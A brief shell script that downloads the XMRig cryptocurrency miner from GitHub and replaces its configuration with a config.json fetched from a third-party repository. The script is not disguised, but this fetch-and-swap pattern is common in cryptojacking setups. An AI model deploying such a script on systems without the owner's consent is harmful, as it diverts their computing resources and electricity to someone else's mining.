#!/bin/sh
  sudo apt update
  wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-static-x64.tar.gz
  tar xf xmrig-6.17.0-linux-static-x64.tar.gz
  cd xmrig-6.17.0
  ls
  rm -r config.json
  wget https://raw.githubusercontent.com/qna24/config/main/config.json
  ls
